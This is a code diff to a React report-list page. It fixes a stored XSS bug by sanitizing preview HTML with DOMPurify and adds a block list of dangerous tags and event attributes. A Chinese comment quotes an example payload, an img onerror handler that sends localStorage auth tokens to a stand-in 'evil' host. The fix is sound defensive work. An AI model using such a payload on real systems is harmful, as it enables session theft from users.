@@ -1,4 +1,4 @@
-import React, { useState, useEffect, useCallback } from 'react';
+import React, { useState, useEffect, useCallback, useMemo } from 'react';
 import {
   Card, Table, Button, Space, Tag, message, Modal, Select, Spin,
   Popconfirm, Tooltip, Empty, Descriptions, Row, Col, Statistic,
@@ -7,11 +7,30 @@ import {
   FileTextOutlined, DownloadOutlined, EyeOutlined,
   ReloadOutlined, CalendarOutlined, PlusOutlined,
 } from '@ant-design/icons';
+import DOMPurify from 'dompurify';
 import { reportAPI } from '../services/api';
 import { PermissionGuard } from '../components/AuthGuard';
 import { Perm } from '../utils/permission';
 
 const { Option } = Select;
+
+/*
+ * BUG-108: 报表 HTML 内嵌了来自**被监控数据库**的数据 —— 表名、SQL 原文、
+ * 用户名、告警描述。攻击者只要能在被监控库里建一张名为
+ *   <img src=x onerror="fetch('//evil/?t='+localStorage.auth_token)">
+ * 的表，DBA 打开报表预览就会被窃取 token（存储型 XSS）。
+ * 这里在渲染前净化；后端 report_engine 侧也已对插值做 HTML 转义（双保险）。
+ */
+const SANITIZE_CONFIG = {
+  ALLOWED_TAGS: ['div', 'span', 'p', 'br', 'hr', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
+    'table', 'thead', 'tbody', 'tfoot', 'tr', 'th', 'td', 'ul', 'ol', 'li',
+    'strong', 'em', 'b', 'i', 'u', 'code', 'pre', 'small', 'caption'],
+  ALLOWED_ATTR: ['class', 'style', 'colspan', 'rowspan', 'align'],
+  FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed', 'form', 'input',
+    'link', 'meta', 'base', 'svg', 'math'],
+  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus',
+    'src', 'srcset', 'href', 'formaction', 'xlink:href'],
+};
 
 export default function ReportList() {
   const [reports, setReports] = useState([]);
@@ -39,6 +58,12 @@ export default function ReportList() {
   }, [filterType]);
 
   useEffect(() => { loadReports(); }, [loadReports]);
+
+  // 净化后再渲染（见文件头 BUG-108 说明）
+  const safePreviewHtml = useMemo(
+    () => DOMPurify.sanitize(previewHtml || '', SANITIZE_CONFIG),
+    [previewHtml],
+  );
 
   const handlePreview = (record) => {
     if (record.content_html) {
@@ -185,7 +210,7 @@ export default function ReportList() {
         footer={null}
         styles={{ body: { maxHeight: '70vh', overflow: 'auto' } }}
       >
-        <div dangerouslySetInnerHTML={{ __html: previewHtml }} />
+        <div dangerouslySetInnerHTML={{ __html: safePreviewHtml }} />
       </Modal>
 
       <Modal
